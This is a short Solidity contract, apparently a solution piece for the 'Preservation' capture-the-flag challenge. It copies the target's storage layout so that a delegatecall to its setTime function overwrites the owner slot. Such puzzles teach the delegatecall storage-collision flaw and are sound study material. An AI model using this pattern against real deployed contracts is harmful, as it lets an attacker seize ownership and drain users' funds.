// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Mirrors Preservation's first three storage slots for delegatecall.
contract PreservationSolver {
    address public timeZone1Library;
    address public timeZone2Library;
    uint256 public ownerSlot;

    /// @notice Writes the supplied value to slot 2, which is Preservation.owner.
    function setTime(uint256 _time) public {
        ownerSlot = _time;
    }
}
